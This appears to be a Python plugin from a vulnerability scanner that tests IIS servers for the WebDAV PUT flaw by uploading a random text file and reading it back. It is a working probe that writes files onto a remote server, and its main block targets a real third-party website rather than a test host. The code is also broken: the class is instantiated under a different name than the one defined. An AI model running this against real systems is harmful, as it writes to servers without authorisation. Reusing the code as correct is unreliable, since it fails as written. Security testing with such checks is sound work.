#!/usr/bin/env python3

'''
name: iis webdav put漏洞
description: iis webdav put漏洞
'''

from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class Iis_Webdav_Put_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            "User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        }
        self.capta = get_capta()

    def run(self):
        file_name = self.capta
        file_content = self.capta
        url = self.url + "/" + self.capta + ".txt"
        try:
            req = request.put(url, data = {'test': self.capta}, headers = self.headers)
            req_get = request.get(url, headers = self.headers)
            if req_get.status_code == 200 and file_content in req_get.text:
                print('存在iis webdav put漏洞')
                return True
            else:
                print('不存在iis webdav put漏洞')
                return False
        except Exception as e:
            print(e)
            print('不存在iis webdav put漏洞')
            return False
        finally:
            pass

if  __name__ == "__main__":
    IIS_Webdav_Put = IIS_Webdav_Put_BaseVerify('https://blog.csdn.net')
    IIS_Webdav_Put.run()